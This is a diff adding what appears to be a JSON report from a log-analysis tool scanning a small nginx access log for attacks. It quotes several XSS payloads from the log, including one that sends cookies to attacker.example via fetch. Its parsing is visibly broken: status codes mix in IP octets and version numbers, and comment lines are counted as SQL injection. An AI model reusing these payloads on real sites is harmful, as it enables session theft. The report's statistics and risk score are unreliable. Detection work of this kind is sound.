@@ -1,0 +1,279 @@
+{
+  "total_lines": 15,
+  "errors": 2,
+  "warnings": 2,
+  "unique_ips": [
+    "117.0.0.0",
+    "192.0.2.68",
+    "198.51.100.12",
+    "203.0.113.45",
+    "203.0.113.99"
+  ],
+  "top_ips": {
+    "198.51.100.12": 5,
+    "203.0.113.45": 3,
+    "203.0.113.99": 2,
+    "117.0.0.0": 1,
+    "192.0.2.68": 1
+  },
+  "status_codes_raw": [
+    "203",
+    "113",
+    "200",
+    "512",
+    "537",
+    "117",
+    "537",
+    "203",
+    "113",
+    "200",
+    "198",
+    "100",
+    "302",
+    "148",
+    "537",
+    "198",
+    "100",
+    "200",
+    "192",
+    "200",
+    "203",
+    "113",
+    "200",
+    "412",
+    "198",
+    "100",
+    "403",
+    "298",
+    "203",
+    "113",
+    "200",
+    "203",
+    "113",
+    "200",
+    "502",
+    "198",
+    "100",
+    "523",
+    "198",
+    "100"
+  ],
+  "top_status_codes": {
+    "200": 7,
+    "203": 5,
+    "113": 5,
+    "198": 5,
+    "100": 5,
+    "537": 3,
+    "512": 1,
+    "117": 1,
+    "302": 1,
+    "148": 1
+  },
+  "timestamps": [
+    "2025-11-01 15:02:11",
+    "2025-11-01 15:02:13",
+    "2025-11-01 15:05:27",
+    "2025-11-01 15:07:02",
+    "2025-11-01 15:10:44",
+    "2025-11-01 15:15:01",
+    "2025-11-01 15:16:20",
+    "2025-11-01 15:16:21",
+    "2025-11-01 15:19:33",
+    "2025-11-01 15:21:09"
+  ],
+  "timeline": [
+    {
+      "bucket": "2025-11-01 15:02",
+      "count": 2
+    },
+    {
+      "bucket": "2025-11-01 15:05",
+      "count": 2
+    },
+    {
+      "bucket": "2025-11-01 15:07",
+      "count": 1
+    },
+    {
+      "bucket": "2025-11-01 15:10",
+      "count": 1
+    },
+    {
+      "bucket": "2025-11-01 15:15",
+      "count": 1
+    },
+    {
+      "bucket": "2025-11-01 15:16",
+      "count": 2
+    },
+    {
+      "bucket": "2025-11-01 15:19",
+      "count": 1
+    },
+    {
+      "bucket": "2025-11-01 15:21",
+      "count": 1
+    }
+  ],
+  "urls_sample": [
+    "https://example.com/post/12",
+    "http://attacker.example/steal?c="
+  ],
+  "http_methods_count": {
+    "GET": 9,
+    "POST": 4
+  },
+  "top_endpoints": {
+    "/comments": 2,
+    "/admin?lang=<script>while(1)</script>": 2,
+    "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E": 1,
+    "/profile?name=<img": 1,
+    "body": 1,
+    "/?q=%3Csvg%2Fonload%3Dalert(1)%3E": 1,
+    "/search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E": 1,
+    "/cart?item_id=12%3Cscript%3Ealert(": 1,
+    "/contact?message=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E": 1,
+    "/product/53?ref=%3Cscript%3Efetch(": 1,
+    "/comments:": 1
+  },
+  "file_paths_sample": [
+    "/search",
+    "/1.1",
+    "/5.0",
+    "/537.36",
+    "/117.0.0.0",
+    "/profile",
+    "/7.88.0",
+    "/comments",
+    "s://example.com/post/12",
+    "/script",
+    "/2.31.0",
+    "/cart",
+    "/admin",
+    "/1.7.9",
+    "/contact",
+    "/product/53",
+    "p://attacker.example/steal"
+  ],
+  "key_value_pairs_count": 12,
+  "key_value_pairs_sample": [
+    {
+      "q": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    },
+    {
+      "name": "<img"
+    },
+    {
+      "src": "x"
+    },
+    {
+      "onerror": "alert('xss')>"
+    },
+    {
+      "comment": "<script>document.cookie</script>"
+    },
+    {
+      "q": "%3Csvg%2Fonload%3Dalert(1)%3E"
+    },
+    {
+      "query": "%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+    },
+    {
+      "item_id": "12%3Cscript%3Ealert('x')%3C%2Fscript%3E"
+    },
+    {
+      "lang": "<script>while(1)</script>"
+    },
+    {
+      "message": "%3Ciframe%20src%3D%22javascript:alert(1)%22%3E"
+    },
+    {
+      "ref": "%3Cscript%3Efetch('http://attacker.example/steal?c='+document.cookie)%3C%2Fscript%3E"
+    },
+    {
+      "lang": "<script>while(1)</script>"
+    }
+  ],
+  "response_size_bytes": {
+    "count": 18,
+    "min": 12,
+    "max": 2048,
+    "avg": 400.27777777777777
+  },
+  "attack_summary": {
+    "sql_injection_samples": [
+      {
+        "line_no": 1,
+        "snippet": "# --- nginx access (combined) ---"
+      },
+      {
+        "line_no": 13,
+        "snippet": "# --- nginx error snippets (app reported) ---"
+      }
+    ],
+    "sql_injection_count": 2,
+    "xss_samples": [
+      {
+        "line_no": 2,
+        "snippet": "2025-11-01T15:02:11+05:30 203.0.113.45 - - \"GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\""
+      },
+      {
+        "line_no": 3,
+        "snippet": "2025-11-01T15:02:13+05:30 203.0.113.45 - - \"GET /profile?name=<img src=x onerror=alert('xss')> HTTP/1.1\" 200 2048 \"-\" \"curl/7.88.0\""
+      },
+      {
+        "line_no": 3,
+        "snippet": "2025-11-01T15:02:13+05:30 203.0.113.45 - - \"GET /profile?name=<img src=x onerror=alert('xss')> HTTP/1.1\" 200 2048 \"-\" \"curl/7.88.0\""
+      },
+      {
+        "line_no": 5,
+        "snippet": "# POST body contained (logged separately by app): comment=<script>document.cookie</script>"
+      },
+      {
+        "line_no": 7,
+        "snippet": "2025-11-01T15:10:44+05:30 192.0.2.68 - - \"GET /search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1\" 200 636 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X)\""
+      },
+      {
+        "line_no": 8,
+        "snippet": "2025-11-01T15:15:01+05:30 203.0.113.45 - - \"GET /cart?item_id=12%3Cscript%3Ealert('x')%3C%2Fscript%3E HTTP/1.1\" 200 412 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+      },
+      {
+        "line_no": 9,
+        "snippet": "2025-11-01T15:16:20+05:30 198.51.100.12 - - \"GET /admin?lang=<script>while(1)</script> HTTP/1.1\" 403 298 \"-\" \"sqlmap/1.7.9#stable\""
+      },
+      {
+        "line_no": 10,
+        "snippet": "2025-11-01T15:19:33+05:30 203.0.113.99 - - \"GET /contact?message=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E HTTP/1.1\" 200 724 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)\""
+      },
+      {
+        "line_no": 11,
+        "snippet": "2025-11-01T15:21:09+05:30 203.0.113.99 - - \"GET /product/53?ref=%3Cscript%3Efetch('http://attacker.example/steal?c='+document.cookie)%3C%2Fscript%3E HTTP/1.1\" 200 998 \"-\" \"Mozilla/5.0\""
+      },
+      {
+        "line_no": 15,
+        "snippet": "2025-11-01T15:16:21+05:30 [warn] 12350#0: *523 Possible XSS attempt: encoded payload in querystring, client: 198.51.100.12, server: example.com, request: \"GET /admin?lang=<script>while(1)</script> HTTP/1.1\""
+      }
+    ],
+    "xss_count": 10
+  },
+  "security_summary": {
+    "risk_score": 100,
+    "messages": [
+      "High risk \u2014 immediate investigation recommended.",
+      "Detected 2 error lines.",
+      "Detected 2 warnings.",
+      "SQL injection indicators: 2 samples.",
+      "XSS indicators: 10 samples."
+    ]
+  },
+  "format_candidates": [
+    "nginx",
+    "apache/nginx_access",
+    "web_access_log"
+  ],
+  "format_guess": "nginx",
+  "detected_format": "nginx",
+  "log_type_detected": "nginx",
+  "generated_at": "2025-11-01 12:03:38 UTC"
+}
